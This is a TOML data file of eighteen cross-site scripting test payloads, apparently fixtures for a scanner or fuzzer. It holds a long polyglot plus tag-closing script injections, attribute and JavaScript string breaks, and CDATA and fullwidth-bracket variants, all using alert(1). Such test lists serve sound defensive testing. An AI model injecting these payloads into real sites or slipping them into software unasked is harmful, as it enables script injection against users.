schema = 1
# Polyglot XSS — payloads valid in multiple contexts (HTML attribute, JS string, etc).

[[case]]
id = "ova_polyglot"
class = "xss"
payload = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"

[[case]]
id = "polyglot_short_1"
class = "xss"
payload = "\"'><img src=x onerror=alert(1)>"

[[case]]
id = "polyglot_short_2"
class = "xss"
payload = "\"><svg/onload=alert(1)>"

[[case]]
id = "polyglot_attribute_break"
class = "xss"
payload = "x' onerror=alert(1) x='"

[[case]]
id = "polyglot_double_attr"
class = "xss"
payload = "\" onmouseover=alert(1) x=\""

[[case]]
id = "polyglot_close_tag"
class = "xss"
payload = "</title><script>alert(1)</script>"

[[case]]
id = "polyglot_close_textarea"
class = "xss"
payload = "</textarea><script>alert(1)</script>"

[[case]]
id = "polyglot_close_style"
class = "xss"
payload = "</style><script>alert(1)</script>"

[[case]]
id = "polyglot_close_xmp"
class = "xss"
payload = "</xmp><script>alert(1)</script>"

[[case]]
id = "polyglot_close_iframe"
class = "xss"
payload = "</iframe><script>alert(1)</script>"

[[case]]
id = "polyglot_close_noscript"
class = "xss"
payload = "</noscript><script>alert(1)</script>"

[[case]]
id = "polyglot_js_string_break"
class = "xss"
payload = "');alert(1);//"

[[case]]
id = "polyglot_js_string_double"
class = "xss"
payload = "\");alert(1);//"

[[case]]
id = "polyglot_js_template_break"
class = "xss"
payload = "${alert(1)}"

[[case]]
id = "polyglot_full_kettle"
class = "xss"
payload = "javascript://%0aalert(1)"

[[case]]
id = "polyglot_xml_cdata"
class = "xss"
payload = "<![CDATA[<script>alert(1)</script>]]>"

[[case]]
id = "polyglot_html_inside_attr"
class = "xss"
payload = "x\" autofocus onfocus=\"alert(1)"

[[case]]
id = "polyglot_unicode_brackets"
class = "xss"
payload = "＜script＞alert(1)＜/script＞"
